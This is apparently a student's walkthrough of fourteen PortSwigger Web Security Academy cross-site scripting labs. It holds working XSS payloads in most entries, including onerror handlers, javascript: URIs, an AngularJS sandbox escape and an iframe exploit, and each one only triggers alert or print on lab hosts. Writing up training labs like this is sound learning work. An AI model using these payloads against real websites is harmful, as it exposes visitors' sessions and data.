<head>
  <style>
    body {
      font-family: "Georgia", serif;
      text-align: justify;
    }
  </style>
</head>

## Basic XSS

<br>

# 01. Reflected XSS into HTML context with nothing encoded
#### Lab: https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded
<b>Problem:</b> This lab contains a simple reflected cross-site scripting vulnerability in the search functionality.

To solve the lab, perform a cross-site scripting attack that <b>calls the alert function</b>.

The steps used to perform can be reached below (sequence).
1. https://0ad8005d03f0bcaf805c0d3b00d6003d.web-security-academy.net/
2. https://0ad8005d03f0bcaf805c0d3b00d6003d.web-security-academy.net/?search=a
3. <p>We can inspect elements on the form, since the input shows our input and wraped on <code>h1</code> tag, then we can try <code>'</h1><img src=a onerror=alert(1)></code>https://0ad8005d03f0bcaf805c0d3b00d6003d.web-security-academy.net/?search=%27%3C%2Fh1%3E%3Cimg+src%3Da+onerror%3Dalert%281%29%3E

<br></br>

# 02. Stored XSS into HTML context with nothing encoded
#### Lab: https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded
<b>Problem:</b> This lab contains a stored cross-site scripting vulnerability in the comment functionality.

To solve this lab, submit a comment that <b>calls the alert function when the blog post is viewed</b>.

The steps used to perform can be reached below (sequence).
1. https://0ae800b5046c0f9c82013310008d0098.web-security-academy.net/.
2. https://0ae800b5046c0f9c82013310008d0098.web-security-academy.net/post?postId=4. On this page there are a few form that might injectable or vulnerable.
3. We can explore and try to give value for all forms (https://0ae800b5046c0f9c82013310008d0098.web-security-academy.net/post/comment/confirmation?postId=4).
4. Since we can put comment, then we can try to bypass the tag. Since our comment wraped on paragraph tag, we can try to close the paragraph tag and peform XSS.
I used simple form input, first is the escape script, then the rest are formalities to submit the form.
<!-- ```</p><script>alert(1)</script>``` -->
  &nbsp;&nbsp;&nbsp;1. <code>&lt;/p&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>
  &nbsp;&nbsp;&nbsp;2. a
  &nbsp;&nbsp;&nbsp;3. a@a
  &nbsp;&nbsp;&nbsp;4. http:a.com

<br></br>

# 03. DOM XSS in <code>document.write</code> sink using source <code>location.search</code>
#### Lab: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink
<b>Problem:</b> This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search, which you can control using the website URL.

To solve this lab, perform a cross-site scripting attack that <b>calls the alert function</b>.

The steps used to perform can be reached below (sequence).
1. https://0aa500ea044aa2dc801c217d00f70042.web-security-academy.net/
2. https://0aa500ea044aa2dc801c217d00f70042.web-security-academy.net/?search=a
3. Since our input can be showen on the page, we can inspect that part. Our input wraped on <code>h1</code> tag, we can try to escape it. Same as before, we can use <code>```'</h1><script>alert(1)</script>```</code>. Unfortunately they use sanitation let's try use <code>```'</h1><img src=a onerror=alert(1)>```</code>, but the result is same.
4. Let's inspect, then we can see that our input also placed on <code>img</code> tag, so we can try another trick by adding <code>"</code>. <code>```"><img src=a onerror=alert(1)>```</code> (https://0aa500ea044aa2dc801c217d00f70042.web-security-academy.net/?search=%22%3E%3Cimg+src%3Da+onerror%3Dalert%281%29%3E).

<br></br>

# 04. DOM XSS in <code>innerHTML</code> sink using source <code>location.search</code>
#### Lab: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink
<b>Problem:</b> This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an innerHTML assignment, which changes the HTML contents of a div element, using data from location.search.

To solve this lab, perform a cross-site scripting attack that <b>calls the alert function</b>.

The steps used to perform can be reached below (sequence).
1. https://0af600d803764fa58046039d0009000e.web-security-academy.net/
2. https://0af600d803764fa58046039d0009000e.web-security-academy.net/?search=a
3. Our input wraped on <code>span</code> tag, let's try to use <code>```</span><img src=a onerror=alert(1)>```</code> (https://0af600d803764fa58046039d0009000e.web-security-academy.net/?search=%3C%2Fspan%3E%3Cimg+src%3Da+onerror%3Dalert%281%29%3E), it worked.

<br></br>

# 05. DOM XSS in jQuery anchor href attribute sink using location.search source
#### Lab: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink
<b>Problem:</b> This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library's $ selector function to find an anchor element, and changes its href attribute using data from location.search.

To solve this lab, make the <b>"back" link alert document.cookie</b>.

The steps used to perform can be reached below (sequence).
1. https://0aba009c03f064e2822a42c900d60015.web-security-academy.net/
2. https://0aba009c03f064e2822a42c900d60015.web-security-academy.net/feedback?returnPath=/
3. Since on the previous page the form not returned our input, then we can change for other page such as https://0aba009c03f064e2822a42c900d60015.web-security-academy.net/post?postId=3. 
4. After try to submit the form, our input showed on the page and wraped by paragraph tag, we can try to escape it by using <code>```></p><img src=a onerror=alert(document.cookie)>```</code> on the comment section, and fill the rest to perform attack. However, still nothing, now let's back to the feedback page and inspect it to gain informations.
5. After inspecting, we can see there is script that grab the link and set it to return path, so we can try to change the URL from <code>/</code> to <code>javascript:alert(document.cookie)</code>. This because they're using href, so we can execute this script.

<br></br>

# 06. DOM XSS in jQuery selector sink using a hashchange event
#### Lab: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event
<b>Problem:</b> This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's $() selector function to auto-scroll to a given post, whose title is passed via the location.hash property.

To solve the lab, deliver an exploit to the victim that <b>calls the print() function in their browser</b>.

The steps used to perform can be reached below (sequence).
1. https://0a0700dd031104c1800403b800820064.web-security-academy.net/
2. We can inspect the page and can find the JQuery script that listen on 'hashchange' (#) on the end of URL. The script process start with create variable called "post" then assigned to the result of another JQuery selector. 
3. 

<br></br>

# 07. Reflected XSS into attribute with angle brackets HTML-encoded
#### Lab: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded
<b>Problem:</b> This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded. 

To solve this lab, perform a cross-site scripting attack that injects an attribute and <b>calls the alert function</b>.

The steps used to perform can be reached below (sequence).
1. https://0a23003c046bfcfee5c3af2100ed006c.web-security-academy.net/
2. https://0a23003c046bfcfee5c3af2100ed006c.web-security-academy.net/?search=a
3. We can try to see if our input get sanitized by using simple script <code>```'</h1><img src=a onerror=alert(1)>```</code> (https://0a23003c046bfcfee5c3af2100ed006c.web-security-academy.net/?search=%27%3C%2Fh1%3E%3Cimg+src%3Da+onerror%3Dalert%281%29%3E). The result is, web can handle this script so, it's sanitized.
4. Let's try another script by replace the open-close tag by <code>```&lt; ``` for < and ```&gt;``` for ></code>(https://0a23003c046bfcfee5c3af2100ed006c.web-security-academy.net/?search=%27%26lt%3B%2Fh1%26gt%3B%26lt%3Bimg+src%3Da+onerror%3Dalert%281%29%26gt%3B). Unfortunately it doesn't work.
5. After inspecting the page, we can see that our input goes to "value" on the form input, we may attack it by close the <code>"</code> and close tag. Also, since there is sanitation, we're unable to add script such as img, script, then we shall use another thing like <code>"onmouseover="javascript:alert('XSS');"</code> (https://0a23003c046bfcfee5c3af2100ed006c.web-security-academy.net/?search=%22onmouseover%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22).

<br></br>

# 08. Stored XSS into anchor href attribute with double quotes HTML-encoded
#### Lab: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded
<b>Problem:</b> This lab contains a stored cross-site scripting vulnerability in the comment functionality. 

To solve this lab, submit a comment that <b>calls the alert function when the comment author name is clicked</b>.

The steps used to perform can be reached below (sequence).
1. https://0af4001a03c1c4e680f40375000700e5.web-security-academy.net/
2. https://0af4001a03c1c4e680f40375000700e5.web-security-academy.net/post?postId=7
3. Since on this page has comments which means there might be a vulnerability on the form. We can try to write "something" on the form. Our comment placed on the page and inside of paragraph tag, we can try to escape it by closing the paragraph tag. <code>```</p><img src=a onerror=alert(1)>```</code>. After submit, this script won't work because of sanitation.
4. We can start inspect and find another things. We can see our website is on <code>href</code>, we can add double-quote to close the href and close tag to escape. <code>```javascript:alert(1)```</code> on website input, because our website put inside of href. (https://0af4001a03c1c4e680f40375000700e5.web-security-academy.net/post/comment/confirmation?postId=7).

<br></br>

# 09. Reflected XSS into a JavaScript string with angle brackets HTML encoded
#### Lab: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded
<b>Problem:</b> This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string. 

To solve this lab, perform a cross-site scripting attack that <b>breaks out of the JavaScript string and calls the alert function</b>.

The steps used to perform can be reached below (sequence).
1. https://0a97008b0338a44681e5117100fa0089.web-security-academy.net/
2. https://0a97008b0338a44681e5117100fa0089.web-security-academy.net/?search=a
3. Based on previous lessons, we can inspect and our input on search bar placed not only on h1 tag but also the img tag resource, let's try to escape it by double-quote and create script <code>```';alert(1); let a='a```</code> because the script are 
<code> var searchTerms = '';alert(1); let a='a';
  ```document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');```
</code>
We can try to escape and use this script to exploit it.

<br></br>

# 10. DOM XSS in document.write sink using source location.search inside a select element
#### Lab: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element
<b>Problem:</b> This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search which you can control using the website URL. The data is enclosed within a select element.

To solve this lab, perform a cross-site scripting attack that <b>breaks out of the select element and calls the alert function</b>.

The steps used to perform can be reached below (sequence).
1. https://0a0d0079037012dd801fdfb600cd0021.web-security-academy.net/
2. https://0a0d0079037012dd801fdfb600cd0021.web-security-academy.net/product?productId=1
3. Since there is no submit button, we can perform attack from URL, let's try to escape the productId value ```<code>"><script>alert(1)</script>```</script></code>https://0a0d0079037012dd801fdfb600cd0021.web-security-academy.net/product?productId=1%22%3E%3Cscript%3Ealert(1)%3C/script. Then it showed response "Invalid product ID", which means we cannot add something directly to the productId value.
4. Let's try another way such as add some storeId, because the page has storeId inside of script (<code>document.write</code>). So we can try to escape the storeId <code>&storeId="></code>, then escape select <code>```</select>```</code>, last thing is just add the script such as img as usual. <code>```<img src=a onerror=alert(1)>```</code> (https://0a0d0079037012dd801fdfb600cd0021.web-security-academy.net/product?productId=1&storeId=%22%3E%3C/select%3E%3Cimg%20src=a%20onerror=alert(1)%3E).

<br></br>

# 11. DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
#### Lab: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression
<b>Problem:</b> This lab contains a DOM-based cross-site scripting vulnerability in a AngularJS expression within the search functionality.

AngularJS is a popular JavaScript library, which scans the contents of HTML nodes containing the ng-app attribute (also known as an AngularJS directive). When a directive is added to the HTML code, you can execute JavaScript expressions within double curly braces. This technique is useful when angle brackets are being encoded.

To solve this lab, perform a cross-site scripting attack that <b>executes an AngularJS expression and calls the alert function</b>.

The steps used to perform can be reached below (sequence).
1. https://0a0a0008045491b080d26c1e00bf0007.web-security-academy.net/
2. https://0a0a0008045491b080d26c1e00bf0007.web-security-academy.net/post?postId=2
3. There is comment section, let's try to see the response and learn how this work. After try few payload to escape all the tag on every input form, nothing works. Then I back to the home page and try to attack the search box input (https://0a0a0008045491b080d26c1e00bf0007.web-security-academy.net/?search=%3C%2Fh1%3E%3Cimg+src%3Da+onerror%3Dalert%281%29%3E), but the result was same.
4. Since the basic attacks won't work at all, then as the purpose of this lab was break through AngularJS, we have to learn about it and try use as our weapon. The AngularJS as a framework has ability to execute js by using double braces <code>{{ }}</code> let's try 1+1 <code>{{1+1}}</code> (https://0a0a0008045491b080d26c1e00bf0007.web-security-academy.net/?search=%7B%7B1%2B1%7D%7D). The page show the result: 2.
5. Since this happened, we can try to use it <code>{{alert(1)}}</code> (https://0a0a0008045491b080d26c1e00bf0007.web-security-academy.net/?search=%7B%7Balert%281%29%7D%7D), but the alert won't show up, this might happened because of restrictions, then let's try to learn attribute on AngularJS, especially on ng-scope.
6. https://www.techstrikers.com/AngularJS/angularjs-scope-methods.php we can use such as <code>$watch</code> or others. Let's try to use <code>{{$watch.alert(1)}}</code> (https://0a0a0008045491b080d26c1e00bf0007.web-security-academy.net/?search=%7B%7B%24watch.alert%28%29%7D%7D), with this we're still not able to execute js, then we have to make constructor that execute the alert function <code>{{$watch.constructor(alert(1))}}</code> (https://0a0a0008045491b080d26c1e00bf0007.web-security-academy.net/?search=%7B%7B%24watch.construct%28%27alert%281%29%27%29%7D%7D), it shows "function anonymous(){undefined}".
7. Let's try to adjust the constructor and script <code>{{ $watch.constructor('alert(1)') }}</code> but the respons showed "function anonymous( ) { alert(1) }", let's adjust it once more <code>{{$watch.constructor('alert(1)')()}}</code> (https://0a0a0008045491b080d26c1e00bf0007.web-security-academy.net/?search=%7B%7B%24watch.constructor%28%27alert%281%29%27%29%28%29%7D%7D).

<br></br>

# 12. Reflected DOM XSS
#### Lab: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected
<b>Problem:</b> This lab demonstrates a reflected DOM vulnerability. Reflected DOM vulnerabilities occur when the server-side application processes data from a request and echoes the data in the response. A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink.

To solve this lab, create an injection that <b>calls the alert() function</b>.

The steps used to perform can be reached below (sequence).
1. https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected
2. https://0ade009103fee64e80d08aa5002100c4.web-security-academy.net/?search=a
3. Based on inspection, we can see the "searchResults.js" with "eval", and also there is JSON response after we sent our input. With this informations. After try few input, the backslash <code>```\```</code> can be escaped from the JSON response, now we can try (https://0ade009103fee64e80d08aa5002100c4.web-security-academy.net/?search=\%22-alert(1)//).

# 13. Stored DOM XSS
#### Lab: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored
<b>Problem:</b> This lab demonstrates a stored DOM vulnerability in the blog comment functionality. 

To solve this lab, exploit this vulnerability to <b>call the alert() function</b>.
The steps used to perform can be reached below (sequence).
1. https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected
2. https://0acf00750317f7cd81f6e8c3004300e3.web-security-academy.net/post?postId=8
3. I've tried <code>```"</textarea> <script>alert(1)</script>```</code> with the simple input required for Name, Email, Website; the 2nd payload for Text Area is <code>```"</p> <script>alert(1)</script>```</code>. Since two of payloads failed, then need to other trick to bypass the sanitazion.
4. We can try to put the bracket, so the first bracket would be sanitized and the rest are escaped. <code>```"</p><><img src=a onerror=alert(1)>```</code>.
5. With this, the script was able to execute and well stored on the website. This will cause every visitors will get the impact of script execution.

# 14. DOM XSS in jQuery selector sink using a hashchange event
#### Lab: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event

<b>Problem:</b> This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's $() selector function to auto-scroll to a given post, whose title is passed via the location.hash property.

To solve this lab, exploit this vulnerability to <b>calls the print() function</b>.
The steps used to perform can be reached below (sequence).
1. https://0a1700b70402ed0b80a5033c00fe00c3.web-security-academy.net/
2. https://0a1700b70402ed0b80a5033c00fe00c3.web-security-academy.net/post?postId=4
I'm using the payload on comment, name, email, website to see the stored  value on the html. Also i try to escape the ```<p>``` tag using <code>```"</p><><img src=a onerror=print()>```</code> (same as previous). Unfortunately it fails.
3. Since this jQuery selector, we need to see deeper and focused on the script. We have to inspect the page and I found:
  ```
<script>
  $(window).on('hashchange', function(){
      var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
      if (post) post.get(0).scrollIntoView();
  });
</script>
  ``` 
4. With that information, we can see directly to the blog section and focused on h2. I simply just pick the first one and try to edit the url: https://0a1700b70402ed0b80a5033c00fe00c3.web-security-academy.net/#Importance%20of%20Relaxing.
5. We can move on to the next script, which variable checking, in this case "post" is the name of the variable. We may check the script 
```
$('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
```
and it shows 

```
p {0: h2, selector: 'section.blog-list h2:contains(Say It With Flowers - Or Maybe Not)', length: 1, prevObject: init, context: document}
```
also if we just set the "post" variable then it shows <code>undefined</code> which <b>no return</b>. So the idea of this script is, if the "post" (variable name) is undefined or just exist, then execute ```post.get(0).scrollIntoView()```.

6. Since I don't know deep about coding and jQuery, let's just try to focus on "post" variable. Let's see this: ```$('section.blog-list h2:contains(<img src=a onerror=alert(1)>)');```. That code will grab the <code>img</code> parameter and just execute the <code>alert</code> function, which means we can try to directly edit the URL and try attack not on our web page but another server, so the web will execute our script.
7. By using this script, we sent our payload to the web then web will execute our script 
```
<iframe src="https://0a1700b70402ed0b80a5033c00fe00c3.web-security-academy.net/#" onload="this.src+='<img src=a onerror=print()>'"></iframe>
```